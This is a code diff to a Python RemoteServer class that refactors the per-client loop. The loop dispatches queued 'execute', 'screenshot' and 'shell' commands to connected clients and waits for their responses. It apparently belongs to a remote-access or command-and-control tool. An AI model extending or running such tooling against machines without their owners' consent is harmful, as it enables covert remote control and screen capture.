@@ -83,25 +83,26 @@ class RemoteServer:
         """Handle communication with a specific client"""
         while self.running and client_id in self.clients:
             try:
-                # Receive command from server interface
-                if hasattr(self, 'pending_commands') and client_id in self.pending_commands:
-                    command = self.pending_commands[client_id]
-                    del self.pending_commands[client_id]
-                    
-                    if command['type'] == 'cmd':
+                # Check if there is a command waiting for THIS client
+                if client_id in self.pending_commands:
+                    command = self.pending_commands.pop(client_id) # Use pop to get and remove
+                
+                    # Map internal command types to the client-side protocol
+                    cmd_type = command['type']
+                    if cmd_type == 'cmd':
                         self.send_command(client_socket, 'execute', command['data'])
-                    elif command['type'] == 'screenshot':
+                    elif cmd_type == 'screenshot':
                         self.send_command(client_socket, 'screenshot', '')
-                    elif command['type'] == 'shell':
+                    elif cmd_type == 'shell':
                         self.send_command(client_socket, 'shell', command['data'])
-                    
-                    # Wait for response
+                
+                    # IMPORTANT: Immediately wait for the response after sending
                     response = self.receive_data(client_socket, timeout=30)
                     if response:
                         self.handle_response(client_id, response)
-                
-                time.sleep(0.1)
-                
+            
+                time.sleep(0.1) # Prevent CPU spiking
+            
             except Exception as e:
                 print(f"[!] Error with client {client_id}: {e}")
                 break
